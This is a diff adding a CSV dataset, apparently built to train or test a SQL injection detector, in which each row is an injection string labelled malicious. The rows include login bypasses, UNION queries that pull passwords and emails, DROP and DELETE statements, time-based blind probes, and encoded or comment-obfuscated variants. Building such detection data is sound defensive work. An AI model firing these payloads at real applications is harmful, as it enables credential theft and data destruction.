@@ -1,0 +1,125 @@
+Query,Label
+' OR 'x'='x',1
+' OR 1=1 --,1
+'; DROP TABLE users;--,1
+' OR 1=1 --,1
+; DROP TABLE IF EXISTS users;--,1
+/*'*/OR 1=1 /*'*/,1
+1; --,1
+1' AND '1'='1,1
+SELECT * FROM users WHERE id = 1 OR (SELECT 1 FROM (SELECT 1)) --,1
+status = 'pending' OR 1=1 --,1
+status LIKE '%%' OR '1'='1',1
+SELECT * FROM orders WHERE status = 'cancelled' OR (SELECT 1 FROM (SELECT 0)),1
+"1 OR ""'""=""'",1
+1 OR /* */ 1=1,1
+1 OR -- 1,1
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',1
+SELECT * FROM users WHERE username = (SELECT username FROM admins LIMIT 1) AND password = '' OR '1'='1',1
+"SELECT * FROM users WHERE username = CHAR(97,100,109,105,'n') COLLATE utf8mb4_general_ci AND password = 'ignore'",1
+"' OR '1'='1 UNION SELECT username, password FROM users --",1
+"` OR `1`=`1 UNION SELECT email, phone FROM customers /*",1
+"'; DROP TABLE IF EXISTS temp; CREATE TABLE temp AS SELECT id, CONCAT(username, ':', password) AS creds FROM users; --",1
+SELECT * FROM users WHERE id = ' OR '1'='1,1
+"-- -
+UNION SELECT password FROM users WHERE id = '-- -'",1
+/* comment */ UNION SELECT username FROM users WHERE id = '#comment',1
+"UNION SELECT username, password FROM users --""",1
+"OR 1=1;--""""""",1
+; DROP TABLE IF EXISTS temp_table; --,1
+1); --,1
+"1');/**/UNION/**/SELECT/**/user_id,/**/password/**/FROM/**/users--",1
+1 OR '1'='1,1
+' OR '1'='1,1
+'; DROP TABLE IF EXISTS fakeusers; --,1
+username LIKE '%admin%' AND password LIKE '%admin%,1
+"[""%\' AND 1=1 --""",1
+"\' OR 1=1 /*""",1
+"%\') OR 1=0; -- \'""",1
+"\' AND (SELECT 1 FROM users WHERE username = 'admin') --""",1
+"\' OR 1=1 UNION SELECT NULL, NULL, password FROM users --""]",1
+(SELECT CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 1 ELSE 0 END),1
+{--} OR 1=1 {--},1
+(CASE WHEN (SELECT password FROM users WHERE id = 1 LIMIT 1) LIKE '%a%' THEN 1 ELSE 0 END),1
+' OR 1=1 --,1
+' AND '1'='1',1
+CASE WHEN 1=1 THEN '1' ELSE '' END,1
+' OR 1=1 --,1
+' AND 1=1 /*,1
+'; DROP TABLE users;--,1
+' OR '1'='1' -- -,1
+' OR SLEEP(5) -- -,1
+'; WAITFOR DELAY '00:00:05' -- -,1
+"' OR '1'='1' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%' || SUBSTRING(password, 1, 1) || '%' SLEEP(5)) --",1
+""" OR ""1""=""1"" AND (SELECT IF(SUBSTRING(password, 1, 1) = 'a', sleep(5), NULL) FROM users)",1
+"' OR '1'='1' AND (BENCHMARK(1000000, MD5('')))",1
+OR 1=1 --,1
+AND sleep(2) /*,1
+OR 1=1; DROP TABLE users --,1
+SELECT * FROM orders WHERE status = 'ACTIVE' AND 1=0 OR 1=1 --' OR SLEEP(5) OR '1'='1,1
+SELECT * FROM orders WHERE status = 'PENDING' AND EXTRACT(HOUR FROM NOW()) > 0 /*',1
+"SELECT * FROM orders WHERE status = 'SHIPPED' AND BENCHMARK(1000000,CRC32(RAND())) --'",1
+;/**/SLEEP(5);--,1
+';-- WAITFOR DELAY '00:00:05' --,1
+"/*
+TIME_WAIT('5')
+*/;WAITFOR DELAY '00:00:05'--",1
+; DROP TABLE IF EXISTS users; --,1
+"'; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --",1
+"--; INSERT INTO users (username, password) VALUES ('admin', 'admin');",1
+; DROP TABLE users; --,1
+; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //,1
+'; DROP DATABASE database_name;--,1
+; DROP TABLE users;,1
+"--
+SELECT id FROM users --",1
+/*malicious*/ ; DELETE FROM users;,1
+; DROP TABLE users --,1
+"; DELETE FROM orders;
+--",1
+--'; INSERT INTO logs VALUES ('hack');--,1
+SELECT * FROM users; DROP TABLE comments; --,1
+--'; DELETE FROM sessions; --,1
+"/* SQL Injection */; SELECT username, password FROM admin",1
+SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin',1
+SELECT * FROM users WHERE username = 'admin' #AND password = 'admin',1
+SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';,1
+/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94',1
+--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%',1
+#SELECT * FROM products WHERE name LIKE '/*%',1
+--' OR '1'='1,1
+/**/1=1,1
+SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC,1
+SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC,1
+SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC,1
+--' OR '1'='1,1
+#' OR '1'='1,1
+/**/' OR '1'='1,1
+%27+OR+1=1;--,1
+%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;),1
+"UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1",1
+%25' OR '1'='1,1
+"' OR ASCII(SUBSTRING(username,1,1))=116 --",1
+%23SELECT+*+FROM+users+WHERE+id+%3D+'admin',1
+SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),1
+/*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',1
+%27--,1
+%60;/**/,1
+CHAR(39)%0A,1
+"%27+UNION+SELECT+NULL,+body+FROM+users--",1
+"CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*",1
+SELECT * FROM users WHERE username = '' OR '1'='1',1
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',1
+"SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))",1
+;select * from users where username like '%' --,1
+' OR EXISTS(SELECT 1 FROM orders),1
+'; DROP TABLE IF EXISTS backups;--,1
+(SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),1
+1 AND (SELECT COUNT(*) FROM users WHERE id=2),1
+-- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),1
+(SELECT status FROM users WHERE username = 'admin' AND password = 'password'),1
+/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */),1
+OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp),1
+(SELECT body FROM comments WHERE user_id=1)--,1
+--(SELECT body FROM comments WHERE user_id=1) --,1
+;--(SELECT body FROM comments WHERE user_id=1);--,1
